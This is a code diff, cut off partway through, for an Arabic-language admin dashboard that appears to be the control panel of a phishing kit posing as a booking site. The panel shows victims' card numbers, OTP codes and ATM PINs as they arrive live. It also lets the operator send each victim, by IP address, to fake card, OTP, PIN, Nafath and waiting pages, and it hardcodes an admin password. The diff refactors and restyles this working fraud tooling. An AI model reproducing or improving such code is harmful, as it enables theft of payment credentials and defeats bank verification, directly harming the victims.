@@ -74,10 +74,15 @@ body { font-family: 'Cairo', 'Segoe UI', sans-serif; background: #f1f5f9; direct
 .conn-dot { width: 8px; height: 8px; border-radius: 50%; background: #94a3b8; }
 .conn-dot.online { background: #22c55e; animation: pulse 2s infinite; }
 @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
-.visitor-badge {
-  display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 700;
-  padding: 6px 14px; border-radius: 20px; background: #dbeafe; color: #2563eb;
+
+/* Visitor counter - same style as original */
+.visitor-counter {
+  display: flex; align-items: center; gap: 6px;
+  background: #f0fdf4; border: 1.5px solid #bbf7d0; border-radius: 20px;
+  padding: 5px 14px; font-size: 13px; font-weight: 700; color: #16a34a;
 }
+.visitor-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 2s infinite; }
+
 .btn-logout {
   padding: 8px 16px; background: #fee2e2; color: #ef4444; border: none;
   border-radius: 10px; font-size: 13px; font-weight: 700; cursor: pointer;
@@ -136,7 +141,6 @@ table { width: 100%; border-collapse: collapse; }
 thead th {
   background: #f8fafc; padding: 12px 16px; font-size: 11px; font-weight: 700;
   color: #64748b; text-align: right; border-bottom: 1px solid #f1f5f9;
-  text-transform: uppercase; letter-spacing: 0.3px;
 }
 tbody td { padding: 14px 16px; font-size: 13px; color: #334155; border-bottom: 1px solid #f8fafc; }
 tbody tr:last-child td { border-bottom: none; }
@@ -196,18 +200,18 @@ tbody tr:hover td { background: #fafbfc; }
 /* ============ MODAL ============ */
 .modal-overlay {
   display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.55);
-  z-index: 1000; align-items: center; justify-content: center; padding: 16px;
+  z-index: 1000; align-items: flex-start; justify-content: center; padding: 20px;
+  overflow-y: auto;
 }
 .modal-overlay.open { display: flex; }
 .modal {
-  background: #fff; border-radius: 20px; width: 100%; max-width: 580px;
-  max-height: 92vh; overflow-y: auto; box-shadow: 0 25px 60px rgba(0,0,0,0.25);
-  direction: rtl;
+  background: #fff; border-radius: 20px; width: 100%; max-width: 600px;
+  box-shadow: 0 25px 60px rgba(0,0,0,0.25); direction: rtl; margin: auto;
 }
 .modal-header {
   padding: 20px 24px; border-bottom: 1px solid #f1f5f9;
   display: flex; align-items: center; justify-content: space-between;
-  position: sticky; top: 0; background: #fff; z-index: 10; border-radius: 20px 20px 0 0;
+  border-radius: 20px 20px 0 0;
 }
 .modal-header-left { display: flex; flex-direction: column; gap: 2px; }
 .modal-header-title { font-size: 16px; font-weight: 800; color: #1e293b; }
@@ -231,10 +235,7 @@ tbody tr:hover td { background: #fafbfc; }
 .msec-title-icon svg { width: 11px; height: 11px; }
 .ti-blue { background: #dbeafe; color: #2563eb; }
 .ti-green { background: #dcfce7; color: #16a34a; }
-.ti-orange { background: #ffedd5; color: #ea580c; }
 .ti-purple { background: #ede9fe; color: #7c3aed; }
-.ti-teal { background: #ccfbf1; color: #0d9488; }
-.ti-amber { background: #fef3c7; color: #d97706; }
 
 .mfield-grid { background: #f8fafc; border-radius: 14px; padding: 4px 0; }
 .mfield {
@@ -252,88 +253,96 @@ tbody tr:hover td { background: #fafbfc; }
 .copy-btn:hover { background: #cbd5e1; }
 .copy-btn svg { width: 12px; height: 12px; }
 
-/* Card section */
-.card-section {
-  border: 2px solid #e2e8f0; border-radius: 14px; padding: 16px; margin-bottom: 14px;
-  transition: border-color 0.3s;
+/* ---- CARD BOX ---- */
+.card-box {
+  border: 2px solid #e2e8f0; border-radius: 16px; overflow: hidden;
+  margin-bottom: 14px; transition: border-color 0.3s;
 }
-.card-section.active-card { border-color: #7c3aed; }
-.card-section.active-otp { border-color: #d97706; }
-.card-section.active-pin { border-color: #0d9488; }
-.card-section-header {
-  display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;
+.card-box.has-card { border-color: #7c3aed; }
+.card-box-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 16px; background: #fafafa; border-bottom: 1px solid #f1f5f9;
 }
-.card-section-title {
-  font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px;
+.card-box-title {
+  font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px;
+  color: #334155;
 }
+.live-dot {
+  width: 8px; height: 8px; border-radius: 50%; background: #ef4444;
+  animation: pulse 1s infinite;
+}
+
+/* Card number display */
+.card-number-display {
+  font-size: 20px; font-weight: 900; letter-spacing: 4px; color: #1e293b;
+  font-family: 'Courier New', monospace; direction: ltr;
+}
+.card-info-row {
+  display: flex; gap: 0; border-top: 1px solid #f1f5f9;
+}
+.card-info-cell {
+  flex: 1; padding: 10px 16px; border-left: 1px solid #f1f5f9;
+}
+.card-info-cell:last-child { border-left: none; }
+.card-info-cell label { font-size: 10px; color: #94a3b8; font-weight: 700; display: block; margin-bottom: 3px; text-transform: uppercase; }
+.card-info-cell span { font-size: 14px; font-weight: 800; color: #1e293b; direction: ltr; display: block; font-family: 'Courier New', monospace; }
+
+/* OTP / PIN inside card box */
+.code-row {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 10px 16px; border-top: 1px solid #f1f5f9;
+}
+.code-row-label { font-size: 11px; font-weight: 700; color: #64748b; }
+.code-row-value { font-size: 22px; font-weight: 900; letter-spacing: 6px; font-family: 'Courier New', monospace; }
+.code-otp { color: #d97706; }
+.code-pin { color: #0d9488; }
+
+/* Waiting state */
 .waiting-state {
   display: flex; align-items: center; justify-content: center; gap: 8px;
-  padding: 18px; color: #94a3b8; font-size: 13px; font-weight: 600;
+  padding: 20px; color: #94a3b8; font-size: 13px; font-weight: 600;
 }
 @keyframes spin { to { transform: rotate(360deg); } }
 .spinner { animation: spin 1s linear infinite; display: inline-block; }
 .spinner svg { width: 16px; height: 16px; }
 
-/* Code display */
-.code-box {
-  text-align: center; padding: 16px; background: #f8fafc; border-radius: 12px;
-  margin: 10px 0;
-}
-.code-value { font-size: 36px; font-weight: 900; letter-spacing: 10px; line-height: 1; }
-.code-otp { color: #d97706; }
-.code-pin { color: #0d9488; }
-.code-label { font-size: 11px; color: #94a3b8; margin-top: 6px; font-weight: 600; }
-
 /* Action buttons */
-.action-row { display: flex; gap: 10px; margin-top: 12px; }
+.action-row { display: flex; gap: 10px; padding: 12px 16px; border-top: 1px solid #f1f5f9; }
 .btn-action {
-  flex: 1; padding: 12px; border: none; border-radius: 12px; font-size: 14px;
+  flex: 1; padding: 11px; border: none; border-radius: 10px; font-size: 13px;
   font-weight: 700; cursor: pointer; font-family: inherit; display: flex;
   align-items: center; justify-content: center; gap: 6px; transition: all 0.2s;
 }
-.btn-action svg { width: 16px; height: 16px; }
-.btn-approve-gray, .btn-reject-gray {
-  background: #e2e8f0; color: #94a3b8; pointer-events: none;
-}
+.btn-action svg { width: 14px; height: 14px; }
+.btn-approve-gray { background: #e2e8f0; color: #94a3b8; pointer-events: none; }
+.btn-reject-gray { background: #e2e8f0; color: #94a3b8; pointer-events: none; }
 .btn-approve-active { background: #16a34a; color: #fff; }
 .btn-approve-active:hover { background: #15803d; }
 .btn-reject-active { background: #ef4444; color: #fff; }
 .btn-reject-active:hover { background: #dc2626; }
 
-/* Booking action footer */
-.modal-footer {
-  padding: 16px 24px; border-top: 1px solid #f1f5f9;
-  display: flex; gap: 10px;
+/* Nav buttons inside modal */
+.nav-btns-wrap { display: flex; flex-wrap: wrap; gap: 8px; }
+.btn-nav-page {
+  padding: 8px 14px; border: none; border-radius: 10px; font-size: 12px;
+  font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity 0.2s;
 }
-.btn-booking-approve {
-  flex: 1; padding: 12px; background: #16a34a; color: #fff; border: none;
-  border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer;
-  font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 6px;
-  transition: background 0.2s;
-}
-.btn-booking-approve:hover { background: #15803d; }
-.btn-booking-reject {
-  flex: 1; padding: 12px; background: #ef4444; color: #fff; border: none;
-  border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer;
-  font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 6px;
-  transition: background 0.2s;
-}
-.btn-booking-reject:hover { background: #dc2626; }
+.btn-nav-page:hover { opacity: 0.85; }
 
 /* Pulse */
-@keyframes sectionPulse {
+@keyframes boxPulse {
   0% { box-shadow: 0 0 0 0 rgba(124,58,237,0.4); }
-  70% { box-shadow: 0 0 0 10px rgba(124,58,237,0); }
+  70% { box-shadow: 0 0 0 8px rgba(124,58,237,0); }
   100% { box-shadow: 0 0 0 0 rgba(124,58,237,0); }
 }
-.pulse-section { animation: sectionPulse 0.8s ease; }
+.pulse-box { animation: boxPulse 0.8s ease; }
 
 /* Toast */
 .toast {
   position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
   background: #1e293b; color: #fff; padding: 12px 24px; border-radius: 12px;
   font-size: 13px; font-weight: 600; z-index: 9999; display: none;
-  box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+  box-shadow: 0 8px 24px rgba(0,0,0,0.2); white-space: nowrap;
 }
 .toast.show { display: block; animation: fadeInUp 0.3s ease; }
 @keyframes fadeInUp { from{opacity:0;transform:translateX(-50%) translateY(10px)} to{opacity:1;transform:translateX(-50%) translateY(0)} }
@@ -363,7 +372,7 @@ tbody tr:hover td { background: #fafbfc; }
       <label>كلمة المرور</label>
       <input type="password" id="pwInput" placeholder="أدخل كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
       <button class="eye-btn" type="button" onclick="togglePw()">
-        <svg id="eyeIcon" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="18" height="18"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="18" height="18"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
       </button>
     </div>
     <div id="loginError" class="login-error">كلمة المرور غير صحيحة</div>
@@ -388,18 +397,15 @@ tbody tr:hover td { background: #fafbfc; }
       </div>
     </div>
     <div class="navbar-right">
-      <div class="visitor-badge">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="14" height="14"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
-        <span id="visitorCount">0</span> زائر
+      <div class="visitor-counter">
+        <div class="visitor-dot"></div>
+        <span id="visitorCount">0</span> زائر متصل
       </div>
       <div class="conn-badge">
         <div class="conn-dot" id="connDot"></div>
         <span id="connText">غير متصل</span>
       </div>
-      <button class="btn-logout" onclick="doLogout()">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="14" height="14" style="display:inline-block;margin-left:4px"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
-        خروج
-      </button>
+      <button class="btn-logout" onclick="doLogout()">خروج</button>
     </div>
   </nav>
 
@@ -495,7 +501,6 @@ tbody tr:hover td { background: #fafbfc; }
       </button>
     </div>
     <div class="modal-body" id="modalBody"></div>
-    <div class="modal-footer" id="modalFooter"></div>
   </div>
 </div>
 
@@ -509,8 +514,10 @@ const ADMIN_PASSWORD = 'Vsafety@2024';
 let socket = null;
 let allBookings = [];
 let currentModalIp = null;
-let liveData = {}; // ip -> { requestId, paymentData, otpData, pinData }
-let liveStatus = {}; // ip -> 'payment' | 'otp' | 'pin' | null
+// liveData[ip] = { requestId, paymentData, otpData, pinData }
+let liveData = {};
+// liveStatus[ip] = 'payment' | 'otp' | 'pin'
+let liveStatus = {};
 
 // ===== LOGIN =====
 function togglePw() {
@@ -554,7 +561,7 @@ function initSocket() {
   });
 
   socket.on('visitorUpdate', (visitors) => {
-    const count = visitors.length;
+    const count = Array.isArray(visitors) ? visitors.length : visitors;
     document.getElementById('visitorCount').textContent = count;
     document.getElementById('statVisitors2').textContent = count;
   });
@@ -564,7 +571,7 @@ function initSocket() {
     renderBookings();
     updateStats();
     playBeep(880);
-    showToast('حجز جديد: ' + (booking.name || ''));
+    showToast('📋 حجز جديد: ' + (booking.name || ''));
   });
 
   socket.on('bookingUpdated', (booking) => {
@@ -574,40 +581,56 @@ function initSocket() {
     updateStats();
   });
 
+  // ---- New payment data ----
   socket.on('newPayment', (data) => {
     const ip = data.ip;
     if (!liveData[ip]) liveData[ip] = {};
     liveData[ip].requestId = data.requestId;
     liveData[ip].paymentData = data;
+    // Reset OTP/PIN when new payment comes
     liveData[ip].otpData = null;
     liveData[ip].pinData = null;
     liveStatus[ip] = 'payment';
+
     updateRowBadge(ip, 'payment');
     updatePendingCount();
     playBeep(660);
-    showToast('بيانات بطاقة جديدة وصلت');
-    if (currentModalIp === ip) refreshModalLive(ip);
+    showToast('💳 بيانات بطاقة جديدة');
+
+    // If modal is open for this IP, update it immediately
+    if (currentModalIp === ip) {
+      rebuildModalLive(ip);
+    }
   });
 
+  // ---- New OTP or PIN ----
   socket.on('newCode', (data) => {
     const ip = data.ip;
     const type = data.type || 'otp';
+
     if (!liveData[ip]) liveData[ip] = {};
     liveData[ip].requestId = data.requestId;
+
     if (type === 'pin') {
       liveData[ip].pinData = data;
       liveStatus[ip] = 'pin';
       updateRowBadge(ip, 'pin');
-      showToast('رقم سري ATM جديد وصل');
+      playBeep(550);
+      showToast('🔒 رقم سري ATM جديد');
     } else {
       liveData[ip].otpData = data;
       liveStatus[ip] = 'otp';
       updateRowBadge(ip, 'otp');
-      showToast('رمز OTP جديد وصل');
+      playBeep(770);
+      showToast('🔑 رمز OTP جديد');
     }
+
     updatePendingCount();
-    playBeep(type === 'pin' ? 550 : 770);
-    if (currentModalIp === ip) refreshModalLive(ip);
+
+    // If modal is open for this IP, update it immediately (no fetch needed)
+    if (currentModalIp === ip) {
+      rebuildModalLive(ip);
+    }
   });
 }
 
@@ -666,8 +689,8 @@ function renderBookings() {
   }
 
   tbody.innerHTML = filtered.map(b => {
-    const statusClass = { new:'badge-new', approved:'badge-approved', rejected:'badge-rejected', pending:'badge-pending' }[b.status] || 'badge-new';
-    const statusLabel = { new:'جديد', approved:'مقبول', rejected:'مرفوض', pending:'قيد المعالجة' }[b.status] || 'جديد';
+    const sc = { new:'badge-new', approved:'badge-approved', rejected:'badge-rejected', pending:'badge-pending' }[b.status] || 'badge-new';
+    const sl = { new:'جديد', approved:'مقبول', rejected:'مرفوض', pending:'قيد المعالجة' }[b.status] || 'جديد';
     const live = liveStatus[b.ip];
     return `
     <tr data-ip="${b.ip || ''}">
@@ -678,8 +701,8 @@ function renderBookings() {
       <td>${b.service_type || '-'}</td>
       <td style="direction:ltr">${b.date_svc || '-'}</td>
       <td>
-        <span class="badge ${statusClass}">${statusLabel}</span>
-        <span class="live-cell">${live ? getLiveBadge(live) : ''}</span>
+        <span class="badge ${sc}">${sl}</span>
+        <span class="live-cell" style="margin-right:4px">${live ? getLiveBadge(live) : ''}</span>
       </td>
       <td>
         <div style="display:flex;gap:6px;align-items:center">
@@ -688,7 +711,7 @@ function renderBookings() {
             تفاصيل
           </button>
           <div class="btn-nav-wrap">
-            <button class="btn-nav" onclick="toggleNav(this, '${b.ip}')">
+            <button class="btn-nav" onclick="toggleNav(this,'${b.ip}')">
               <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="13" height="13"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
               توجيه
             </button>
@@ -704,19 +727,19 @@ function renderBookings() {
 
 function buildNavItems(ip) {
   const pages = [
-    { page: 'booking', label: 'صفحة الحجز', color: '#16a34a', icon: 'M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z' },
-    { page: 'payments', label: 'صفحة البطاقة', color: '#7c3aed', icon: 'M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z' },
-    { page: 'phone', label: 'صفحة الهاتف', color: '#2563eb', icon: 'M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z' },
-    { page: 'code', label: 'صفحة OTP', color: '#d97706', icon: 'M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z' },
-    { page: 'madaPin', label: 'صفحة الرقم السري', color: '#0d9488', icon: 'M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z' },
-    { page: 'whats', label: 'صفحة واتساب', color: '#25d366', icon: 'M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z' },
-    { page: 'nafad', label: 'صفحة نفاذ', color: '#ea580c', icon: 'M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2' },
-    { page: 'stcCall', label: 'صفحة الانتظار', color: '#64748b', icon: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z' },
+    { page: 'booking', label: 'صفحة الحجز', color: '#16a34a', d: 'M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z' },
+    { page: 'payments', label: 'صفحة البطاقة', color: '#7c3aed', d: 'M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z' },
+    { page: 'phone', label: 'صفحة الهاتف', color: '#2563eb', d: 'M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z' },
+    { page: 'code', label: 'صفحة OTP', color: '#d97706', d: 'M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z' },
+    { page: 'madaPin', label: 'صفحة الرقم السري', color: '#0d9488', d: 'M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z' },
+    { page: 'whats', label: 'صفحة واتساب', color: '#25d366', d: 'M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z' },
+    { page: 'nafad', label: 'صفحة نفاذ', color: '#ea580c', d: 'M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0' },
+    { page: 'stcCall', label: 'صفحة الانتظار', color: '#64748b', d: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z' },
   ];
   return pages.map(p => `
-    <div class="nav-item" onclick="navigateTo('${ip}', '${p.page}')">
+    <div class="nav-item" onclick="navigateTo('${ip}','${p.page}')">
       <div class="nav-item-icon" style="background:${p.color}20;color:${p.color}">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="${p.icon}"/></svg>
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="${p.d}"/></svg>
       </div>
       ${p.label}
     </div>`).join('');
@@ -737,14 +760,22 @@ document.addEventListener('click', () => {
 async function navigateTo(ip, page) {
   document.querySelectorAll('.nav-dropdown.open').forEach(d => d.classList.remove('open'));
   try {
-    await fetch(`${SERVER_URL}/api/navigate`, {
+    const res = await fetch(`${SERVER_URL}/api/navigate`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ ip, page })
     });
-    showToast('تم توجيه العميل إلى: ' + page);
+    const data = await res.json();
+    if (data.success || data.sent) {
+      showToast('✅ تم التوجيه إلى: ' + page);
+    } else {
+      // Fallback via socket
+      if (socket) socket.emit('adminNavigate', { ip, page });
+      showToast('✅ تم التوجيه إلى: ' + page);
+    }
   } catch(e) {
     if (socket) socket.emit('adminNavigate', { ip, page });
+    showToast('✅ تم التوجيه إلى: ' + page);
   }
 }
 
@@ -775,9 +806,10 @@ async function showDetails(bookingId) {
 
 function buildModalContent(booking, extraData) {
   const body = document.getElementById('modalBody');
-  const footer = document.getElementById('modalFooter');
 
-  // Client info
+  const sc = { new:'badge-new', approved:'badge-approved', rejected:'badge-rejected', pending:'badge-pending' }[booking.status] || 'badge-new';
+  const sl = { new:'جديد', approved:'مقبول', rejected:'مرفوض', pending:'قيد المعالجة' }[booking.status] || 'جديد';
+
   let html = `
   <div class="msec">
     <div class="msec-title">
@@ -796,16 +828,14 @@ function buildModalContent(booking, extraData) {
       <div class="mfield"><span class="mfield-label">التاريخ</span><span class="mfield-value">${booking.date_svc || '-'}</span></div>
       <div class="mfield"><span class="mfield-label">الوقت</span><span class="mfield-value">${booking.time_svc || '-'}</span></div>
       <div class="mfield"><span class="mfield-label">IP العميل</span><span class="mfield-value">${booking.ip || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">الحالة</span><span class="mfield-value">
-        <span class="badge ${{ new:'badge-new', approved:'badge-approved', rejected:'badge-rejected', pending:'badge-pending' }[booking.status] || 'badge-new'}">${{ new:'جديد', approved:'مقبول', rejected:'مرفوض', pending:'قيد المعالجة' }[booking.status] || 'جديد'}</span>
-      </span></div>
+      <div class="mfield"><span class="mfield-label">الحالة</span><span class="mfield-value"><span class="badge ${sc}">${sl}</span></span></div>
       <div class="mfield"><span class="mfield-label">تاريخ الإنشاء</span><span class="mfield-value">${booking.created_at ? new Date(booking.created_at).toLocaleString('ar-SA') : '-'}</span></div>
       <div class="mfield"><span class="mfield-label">آخر تحديث</span><span class="mfield-value">${booking.updated_at ? new Date(booking.updated_at).toLocaleString('ar-SA') : '-'}</span></div>
     </div>
   </div>`;
 
-  // Live data sections
-  html += buildLiveSections(booking.ip, extraData);
+  // Live card section
+  html += buildCardSection(booking.ip, extraData);
 
   // Navigation section
   html += `
@@ -816,30 +846,20 @@ function buildModalContent(booking, extraData) {
       </div>
       توجيه العميل إلى صفحة
     </div>
-    <div style="display:flex;flex-wrap:wrap;gap:8px">
-      <button onclick="navigateTo('${booking.ip}','payments')" style="padding:8px 14px;background:#ede9fe;color:#7c3aed;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">💳 الدفع</button>
-      <button onclick="navigateTo('${booking.ip}','code')" style="padding:8px 14px;background:#fef3c7;color:#d97706;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">🔑 OTP</button>
-      <button onclick="navigateTo('${booking.ip}','madaPin')" style="padding:8px 14px;background:#ccfbf1;color:#0d9488;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">🔒 الرقم السري</button>
-      <button onclick="navigateTo('${booking.ip}','phone')" style="padding:8px 14px;background:#dbeafe;color:#2563eb;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">📱 الهاتف</button>
-      <button onclick="navigateTo('${booking.ip}','booking')" style="padding:8px 14px;background:#dcfce7;color:#16a34a;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">🏠 الرئيسية</button>
+    <div class="nav-btns-wrap">
+      <button class="btn-nav-page" style="background:#ede9fe;color:#7c3aed" onclick="navigateTo('${booking.ip}','payments')">💳 الدفع</button>
+      <button class="btn-nav-page" style="background:#fef3c7;color:#d97706" onclick="navigateTo('${booking.ip}','code')">🔑 OTP</button>
+      <button class="btn-nav-page" style="background:#ccfbf1;color:#0d9488" onclick="navigateTo('${booking.ip}','madaPin')">🔒 الرقم السري</button>
+      <button class="btn-nav-page" style="background:#dbeafe;color:#2563eb" onclick="navigateTo('${booking.ip}','phone')">📱 الهاتف</button>
+      <button class="btn-nav-page" style="background:#dcfce7;color:#16a34a" onclick="navigateTo('${booking.ip}','booking')">🏠 الرئيسية</button>
+      <button class="btn-nav-page" style="background:#f1f5f9;color:#475569" onclick="navigateTo('${booking.ip}','stcCall')">⏳ الانتظار</button>
     </div>
   </div>`;
 
   body.innerHTML = html;
-
-  // Footer
-  footer.innerHTML = `
-    <button class="btn-booking-approve" onclick="updateBookingStatus(${booking.id},'approved')">
-      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-      قبول الحجز
-    </button>
-    <button class="btn-booking-reject" onclick="updateBookingStatus(${booking.id},'rejected')">
-      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
-      رفض الحجز
-    </button>`;
 }
 
-function buildLiveSections(ip, extraData) {
+function buildCardSection(ip, extraData) {
   const live = liveData[ip] || {};
   const pd = live.paymentData;
   const od = live.otpData;
@@ -847,200 +867,219 @@ function buildLiveSections(ip, extraData) {
   const histPayments = (extraData && extraData.payments) || [];
   const histCodes = (extraData && extraData.codes) || [];
 
+  const cardData = pd || (histPayments.length > 0 ? histPayments[histPayments.length - 1] : null);
+  const otpData = od || (histCodes.filter(c => c.code_type !== 'pin').pop() || null);
+  const pinData = pind || (histCodes.filter(c => c.code_type === 'pin').pop() || null);
+
+  const hasCard = !!cardData;
+  const currentStage = liveStatus[ip];
+
   let html = `
-  <div class="msec" id="modal-live-wrap">
+  <div class="msec">
     <div class="msec-title">
       <div class="msec-title-icon ti-green">
         <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
       </div>
       بيانات البطاقة والرموز
-    </div>`;
+    </div>
+    <div class="card-box ${hasCard ? 'has-card' : ''}" id="modal-card-box">
+      <div class="card-box-header">
+        <div class="card-box-title">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16" style="color:${hasCard ? '#7c3aed' : '#94a3b8'}"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+          <span style="color:${hasCard ? '#7c3aed' : '#94a3b8'}">بيانات البطاقة</span>
+        </div>
+        ${pd ? '<div style="display:flex;align-items:center;gap:6px"><div class="live-dot"></div><span style="font-size:11px;color:#ef4444;font-weight:700">مباشر</span></div>' : ''}
+      </div>`;
 
-  // ---- Card section ----
-  const cardActive = !!pd || histPayments.length > 0;
-  html += `<div class="card-section ${pd ? 'active-card' : ''}" id="modal-card-sec">
-    <div class="card-section-header">
-      <div class="card-section-title" style="color:${pd ? '#7c3aed' : '#64748b'}">
-        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
-        بيانات البطاقة
-      </div>
-      ${pd ? '<span class="badge badge-card">مباشر 🔴</span>' : ''}
-    </div>`;
-
